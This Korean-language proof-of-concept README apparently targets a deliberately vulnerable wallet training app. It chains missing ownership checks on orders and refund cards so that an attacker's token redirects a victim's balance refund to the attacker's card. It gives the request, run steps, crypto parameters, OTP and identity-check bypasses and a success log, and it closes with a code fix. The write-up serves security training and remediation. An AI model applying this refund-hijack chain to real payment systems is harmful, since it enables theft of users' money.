# VULN-WALLET-7 PoC — 공격자 카드로 탈취 계정 잔액 환불 수취

환불 API의 두 결함을 체이닝한다.

- **VULN-WALLET-5** — 환불 시 주문 소유권 미검증. 공격자 토큰으로 남의 `merchantUid` 를 환불시킬 수 있다.
- **VULN-WALLET-7** — 환불 목적지 카드의 소유권 미검증(`findById`). 환불을 **공격자 카드**로 수취시킬 수 있다.

결과: 탈취한 부모 계정의 루키즈페이 잔액이 차감되고, 그 돈이 공격자가 등록한 카드로 환불(mock PG payout)된다.

## 공격 흐름

```
피해자: 회원가입 → 실명확인 → 결제비번 → OTP발급(응답 노출) → 충전 prepare/approve  (잔액 50,000)
공격자: 회원가입 → 실명확인 → 결제비번 → 카드 등록(E2E)                          (cardId 확보)
공격  : POST /api/wallet/charge/{피해자 merchantUid}/refund   Bearer <공격자 토큰>
        body: { "cardId": <공격자 cardId> }
      → 피해자 잔액 0, 환불 수취 카드 = 공격자 카드(**** 1111)
```

## 실행 방법 1 — Java 드라이버 (검증됨, 외부 라이브러리 불필요)

서버를 먼저 띄운다(로컬 H2). 그다음:

```bash
# BASE 포트는 Poc.java 상단 상수에서 조정 (기본 8080)
javac -encoding UTF-8 Poc.java
java  -Dfile.encoding=UTF-8 Poc
```

기대 출력: `[취약점 재현 성공] 공격자 토큰 + 공격자 카드로 피해자 잔액을 환불 수취했다.`

> 실제 검증 로그(포트 8081 기동본):
> ```
> [3] 피해자 충전: 잔액=50000원
> [4] 공격자 카드 등록: cardId=1  (**** 1111)
> 응답: refundedAmount=50000, balance=0, maskedCard="**** **** **** 1111", pgRefundId=imprf_...
> 결과: 피해자 50000 → 0 (자금 탈취), 환불은 공격자 카드로 수취
> ```

## 실행 방법 2 — Postman 컬렉션

`rookies-vuln-wallet7.postman_collection.json` 을 Import 후 위에서부터 순서대로 Send.
변수(vTok/aTok/muid/attackerCardId/otp)는 테스트 스크립트가 자동으로 채운다.

- `baseUrl` 컬렉션 변수 기본값: `http://localhost:8080/api`
- **12b. 카드 등록**은 pre-request 스크립트가 RSA-OAEP + AES-GCM E2E 암호화를 수행한다 → **Postman v10+**(node `crypto`) 필요.
  - 실패 시 대안: 모바일 앱으로 공격자 카드를 등록하고, 그 `cardId` 를 `attackerCardId` 변수에 직접 넣은 뒤 **13번**만 실행.

## 크립토 규약 (서버 `HybridDecryptor` 와 동일)

- RSA: `RSA/ECB/OAEPWithSHA-256AndMGF1Padding` (OAEP SHA-256 + MGF1 SHA-256)
- AES: `AES/GCM/NoPadding`, 256-bit 키, IV 12바이트, 인증태그 128비트, `ciphertext = 본문||태그`(Base64)
- 카드 payload(JSON): `cardNumber, expiry, cvc, passwordFront, birthDate, ownerName, paymentPassword, nonce, timestamp(ms)`

## 관문 우회에 사용된 의도적 취약점

- **VULN-EFIN-1** OTP 발급 응답에 코드 노출 → OTP 자동 획득
- **VULN-EFIN-7** 실명확인이 형식/자기일치만 검사 → 임의 값으로 통과
- 공개키는 원래 공개(정상) — E2E 암호화는 규약대로 재현

## 방어

`WalletRefundService` 에서 목적지 카드를 소유자까지 확인한다:

```java
// 취약: cardRepository.findById(cardId)
// 방어:
Card card = cardRepository.findByIdAndOwnerId(cardId, order.getOwnerId())
        .orElseThrow(() -> new AccessDeniedException("본인 카드로만 환불받을 수 있습니다."));
```
추가로 VULN-WALLET-5(주문 소유권)도 `order.getOwnerId().equals(requesterId)` 로 함께 막아야 완전하다.
